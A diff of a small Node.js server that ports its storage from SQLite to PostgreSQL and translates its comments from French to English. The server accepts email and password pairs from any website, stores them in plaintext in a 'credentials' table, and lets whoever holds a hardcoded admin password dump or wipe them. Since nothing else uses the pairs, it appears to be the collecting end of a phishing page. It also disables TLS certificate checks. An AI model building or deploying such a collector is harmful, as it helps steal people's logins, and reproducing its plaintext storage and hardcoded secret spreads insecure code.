@@ -1,13 +1,30 @@
 const http = require('http');
-const db = require('./database.js'); // Importer la base de données
+const { Client } = require('pg'); // Import the pg package to interact with PostgreSQL
 
-// Définir un mot de passe pour sécuriser l'accès
+// Define the database connection string (you will get this from your Render dashboard)
+const client = new Client({
+    connectionString: process.env.DATABASE_URL, // The DATABASE_URL environment variable is set in Render
+    ssl: {
+        rejectUnauthorized: false, // Required for secure connection on Render
+    }
+});
+
+// Connect to the PostgreSQL database
+client.connect()
+    .then(() => {
+        console.log("Connected to PostgreSQL database.");
+    })
+    .catch((err) => {
+        console.error("Error connecting to PostgreSQL database:", err.stack);
+    });
+
+// Define an admin password for secured routes
 const ADMIN_PASSWORD = "kadri_pass";
 
 const requestListener = (req, res) => {
-    console.log(`Requête reçue : Méthode ${req.method}, URL ${req.url}`);
+    console.log(`Request received: Method ${req.method}, URL ${req.url}`);
 
-    // Configurer les en-têtes CORS
+    // Configure CORS headers
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, DELETE');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
@@ -18,109 +35,93 @@ const requestListener = (req, res) => {
         return;
     }
 
-    // Vérifier le mot de passe pour les routes sécurisées
-    const password = req.headers['authorization']; // Le mot de passe est envoyé dans les en-têtes
+    // Check the password for secured routes
+    const password = req.headers['authorization']; // The password is sent in the headers
     if ((req.method === 'GET' || req.method === 'DELETE') && password !== ADMIN_PASSWORD) {
         res.writeHead(401, { 'Content-Type': 'text/plain' });
-        res.end('Mot de passe requis ou incorrect.');
+        res.end('Password required or incorrect.');
         return;
     }
 
-    // Route POST pour stocker les données
+    // POST route to store data in the database
     if (req.method === 'POST' && req.url === '/store') {
         let body = '';
         req.on('data', chunk => {
             body += chunk.toString();
         });
 
-        req.on('end', () => {
+        req.on('end', async () => {
             try {
                 const data = JSON.parse(body);
                 const { email, password } = data;
 
                 if (!email || !password) {
                     res.writeHead(400, { 'Content-Type': 'text/plain' });
-                    res.end('Email et mot de passe sont requis.');
+                    res.end('Email and password are required.');
                     return;
                 }
 
-                // Insérer les données dans la base de données
-                const query = `INSERT INTO credentials (email, password) VALUES (?, ?)`;
-                db.run(query, [email, password], function (err) {
-                    if (err) {
-                        console.error('Erreur lors de l\'insertion dans la base de données :', err);
-                        res.writeHead(500, { 'Content-Type': 'text/plain' });
-                        res.end('Erreur lors de l\'enregistrement.');
-                    } else {
-                        console.log('Données enregistrées avec succès, ID :', this.lastID);
-                        res.writeHead(200, { 'Content-Type': 'text/plain' });
-                        res.end('Informations enregistrées avec succès.');
-                    }
-                });
-            } catch (err) {
-                console.error('Erreur JSON :', err);
-                res.writeHead(400, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ error: 'Données JSON invalides.' }));
-            }
-        });
-    }
+                // Insert data into PostgreSQL database
+                const query = 'INSERT INTO credentials (email, password) VALUES ($1, $2) RETURNING id';
+                const values = [email, password];
 
-    // Route GET pour récupérer les données
-    else if (req.method === 'GET' && req.url === '/data') {
-        const query = `SELECT * FROM credentials`;
-        db.all(query, [], (err, rows) => {
-            if (err) {
-                console.error('Erreur lors de la récupération des données :', err);
-                res.writeHead(500, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ error: 'Erreur lors de la récupération des données.' }));
-            } else {
-                res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify(rows));
-            }
-        });
-    }
+                const result = await client.query(query, values);
 
-    // Route DELETE pour vider la table credentials
-    else if (req.method === 'DELETE' && req.url === '/delete_all') {
-        const deleteQuery = `DELETE FROM credentials`;
-        const resetSequenceQuery = `DELETE FROM sqlite_sequence WHERE name='credentials'`;
-    
-        // Supprimer toutes les données
-        db.run(deleteQuery, function (err) {
-            if (err) {
-                console.error('Erreur lors de la suppression des données :', err);
-                res.writeHead(500, { 'Content-Type': 'text/plain' });
-                res.end('Erreur lors de la suppression des données.');
-                return;
-            }
-    
-            // Réinitialiser le compteur d'auto-incrémentation
-            db.run(resetSequenceQuery, function (err) {
-                if (err) {
-                    console.error('Erreur lors de la réinitialisation du compteur :', err);
-                    res.writeHead(500, { 'Content-Type': 'text/plain' });
-                    res.end('Erreur lors de la réinitialisation du compteur.');
-                    return;
-                }
-    
-                console.log('Toutes les données ont été supprimées et le compteur réinitialisé.');
+                // Return success response
+                console.log('Data successfully inserted, ID:', result.rows[0].id);
                 res.writeHead(200, { 'Content-Type': 'text/plain' });
-                res.end('Toutes les données ont été supprimées et le compteur réinitialisé.');
-            });
+                res.end('Information successfully stored.');
+            } catch (err) {
+                console.error('Error inserting data into PostgreSQL:', err);
+                res.writeHead(500, { 'Content-Type': 'text/plain' });
+                res.end('Error storing the information.');
+            }
         });
     }
 
-    // Route non trouvée
+    // GET route to retrieve data from the database
+    else if (req.method === 'GET' && req.url === '/data') {
+        const query = 'SELECT * FROM credentials';
+        
+        client.query(query)
+            .then(result => {
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify(result.rows));
+            })
+            .catch(err => {
+                console.error('Error retrieving data:', err);
+                res.writeHead(500, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: 'Error retrieving data.' }));
+            });
+    }
+
+    // DELETE route to delete all records from the credentials table
+    else if (req.method === 'DELETE' && req.url === '/delete_all') {
+        const deleteQuery = 'DELETE FROM credentials';
+
+        client.query(deleteQuery)
+            .then(() => {
+                console.log('All records deleted.');
+                res.writeHead(200, { 'Content-Type': 'text/plain' });
+                res.end('All records deleted.');
+            })
+            .catch(err => {
+                console.error('Error deleting records:', err);
+                res.writeHead(500, { 'Content-Type': 'text/plain' });
+                res.end('Error deleting records.');
+            });
+    }
+
+    // Route not found
     else {
         res.writeHead(404, { 'Content-Type': 'text/plain' });
-        res.end('Route non trouvée.');
+        res.end('Route not found.');
     }
 };
 
 const server = http.createServer(requestListener);
 
-// Utiliser le port dynamique fourni par Render, ou un port par défaut pour le développement local
-const PORT = process.env.PORT || 3001;
+const PORT = process.env.PORT || 3000; // Use Render's environment variable for the port
 server.listen(PORT, () => {
-    console.log(`Serveur démarré sur http://localhost:${PORT} ou sur https://kadri-website.onrender.com:${PORT}`);
+    console.log(`Server started on http://localhost:${PORT}`);
 });
